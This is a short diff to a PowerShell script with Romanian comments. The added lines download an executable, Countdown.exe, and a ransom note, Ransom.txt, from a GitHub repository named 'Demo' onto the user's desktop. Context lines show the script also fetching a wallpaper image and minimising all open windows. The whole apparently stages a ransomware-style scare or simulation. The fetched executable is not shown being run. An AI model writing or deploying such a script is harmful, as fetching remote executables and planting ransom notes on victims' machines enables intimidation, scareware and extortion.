@@ -35,6 +35,18 @@ $output = "$env:USERPROFILE\Desktop\Wallpaper.jpg"
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($url, $output)
 
+# Descarca fisierul Countdown.exe
+$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Countdown.exe"
+$output = "$env:USERPROFILE\Desktop\Countdown.exe"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $output)
+
+# Descarca fisierul Ransom.txt
+$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Ransom.txt"
+$output = "$env:USERPROFILE\Desktop\Ransom.txt"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $output)
+
 # Minimizeaza toate aplicatiile care ruleaza
 $shell = New-Object -ComObject Shell.Application
 $shell.MinimizeAll()
